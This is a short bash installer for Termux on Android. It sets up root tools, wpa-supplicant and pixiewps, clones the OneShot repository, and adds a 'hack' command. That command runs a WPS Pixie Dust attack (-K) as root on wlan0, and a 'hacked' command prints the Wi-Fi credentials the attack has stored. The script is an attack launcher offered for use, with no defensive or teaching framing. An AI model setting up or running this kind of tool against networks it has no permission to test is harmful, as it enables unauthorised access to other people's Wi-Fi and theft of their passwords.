#!/data/data/com.termux/files/usr/bin/bash
apt remove -y game-repo science-repo
pkg install -y root-repo
pkg install -y git tsu python wpa-supplicant pixiewps iw

git clone --depth 1 https://github.com/Lunatik-cyber/OneShot OneShot

chmod +x /data/data/com.termux/files/home/OneShot/oneshot.py

echo "cd /data/data/com.termux/files/home/OneShot; sudo python3 oneshot.py -i wlan0 -K -w" > /data/data/com.termux/files/usr/bin/hack
echo "clear; cat /data/data/com.termux/files/home/OneShot/reports/stored.txt" > /data/data/com.termux/files/usr/bin/hacked
chmod +x /data/data/com.termux/files/usr/bin/hack
chmod +x /data/data/com.termux/files/usr/bin/hacked
clear
printf "#########################################################\n
#  All done! Now you can run OneShot with\n
#   sudo python3 OneShot/oneshot.py -i wlan0 -K or hack\n
#\n
#  To update, run\n
#   (cd OneShot && git pull)\n
#\n
#  To see hacked networks:n
#    hacked
#########################################################\n"